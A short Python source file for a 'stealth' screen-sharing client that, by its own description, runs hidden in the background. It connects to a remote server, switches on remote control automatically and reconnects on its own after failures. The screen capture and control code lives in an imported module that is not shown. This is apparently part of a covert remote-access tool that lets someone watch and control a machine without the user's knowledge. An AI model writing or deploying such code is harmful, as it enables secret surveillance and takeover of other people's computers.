"""
Stealth client that runs completely hidden in the background
"""
import sys
import time
from client import ScreenShareClient


class StealthClient(ScreenShareClient):
    """Stealth version that runs without any visible UI"""
    
    def __init__(self):
        super().__init__()
        self.auto_reconnect = True
        
    def run_stealth(self, host, port=5555):
        """
        Run in complete stealth mode
        
        Args:
            host: Server IP to connect to
            port: Server port
        """
        print(f"[Stealth] Connecting to {host}:{port}...")
        
        try:
            self.connect(host, port)
            print("[Stealth] Connected. Running in background...")
            
            # Auto-enable control
            self.start_control()
            
            # Run in background - just keep receiving frames
            while self.running:
                time.sleep(1)
                
        except Exception as e:
            print(f"[Stealth] Error: {e}")
            if self.auto_reconnect:
                print("[Stealth] Reconnecting in 5 seconds...")
                time.sleep(5)
                self.run_stealth(host, port)


def main():
    """Main entry point for stealth client"""
    if len(sys.argv) < 2:
        print("Usage: python stealth_client.py <server_ip> [port]")
        print("Example: python stealth_client.py 192.168.1.100 5555")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5555
    
    client = StealthClient()
    
    try:
        client.run_stealth(host, port)
    except KeyboardInterrupt:
        print("\n[Stealth] Shutting down...")
    finally:
        client.disconnect()


if __name__ == "__main__":
    main()
